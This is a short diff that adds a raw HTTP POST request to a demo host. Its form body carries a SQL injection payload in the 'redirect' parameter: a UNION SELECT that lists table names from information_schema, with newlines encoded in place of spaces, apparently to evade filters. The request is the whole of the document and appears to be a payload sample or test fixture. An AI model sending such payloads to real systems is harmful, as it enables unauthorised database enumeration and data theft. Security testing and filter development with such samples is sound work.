@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Connection: close
+
+redirect=1%0aunion%0aselect%0atable_name%0afrom%0ainformation_schema.tables--%0a-
